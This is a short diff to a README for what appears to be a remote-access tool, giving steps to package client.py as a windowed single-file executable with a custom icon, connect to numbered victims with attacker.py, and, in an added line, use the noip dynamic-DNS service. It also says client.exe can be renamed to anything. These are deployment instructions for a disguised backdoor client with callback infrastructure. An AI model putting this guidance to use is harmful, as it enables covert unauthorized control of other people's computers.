@@ -17,8 +17,9 @@
   1.⠀``` cd <your client.py location> ```\
   2.⠀```pyinstaller --noconfirm --onefile --windowed --icon <your icon location here> client.py```\
   3.⠀Client.exe is now ready
-- Run attacker.py and enter CLIENTNUMBER of a client you want to connect
+- Run attacker.py and enter CLIENTNUMBER of a client you want to connect to
   - if attacker doesnt connect that means that client if offline or an error has occurred, try restarting attacker.py
+- I recommend using [noip](https://www.noip.com/)
 
 **Usage**
 - Feel free to rename client.exe to anything
